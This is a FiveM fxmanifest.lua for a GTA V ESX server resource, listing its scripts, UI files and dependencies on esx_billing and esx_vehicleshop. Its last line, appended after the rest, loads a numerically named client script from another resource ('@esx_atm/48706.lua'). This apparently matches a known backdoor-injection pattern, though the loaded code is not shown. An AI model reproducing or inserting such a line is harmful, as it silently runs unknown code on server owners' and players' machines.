fx_version 'adamant'
game 'gta5'

shared_scripts {
	'@es_extended/locale.lua',
	'locales/es.lua',
	'config.lua'
}

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'server/main.lua'
}

client_scripts {
	'client/*.lua'
}

ui_page 'html/index.html'

files {
  'html/index.html',
  'html/app.js',
  'html/style.css',
  'html/logo.png'
}

dependencies {
	'es_extended',
	'esx_billing',
	'esx_vehicleshop'
}
client_script '@esx_atm/48706.lua'